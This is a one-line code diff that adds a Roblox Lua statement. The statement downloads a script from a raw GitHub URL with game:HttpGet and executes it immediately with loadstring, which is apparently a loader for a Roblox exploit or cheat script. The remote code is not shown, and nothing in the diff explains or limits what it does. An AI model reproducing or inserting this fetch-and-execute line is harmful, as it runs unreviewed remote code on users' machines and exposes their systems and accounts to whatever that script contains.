@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/duyanbui422-byte/rscr/refs/heads/main/Viet%20Nam.lua", true))()
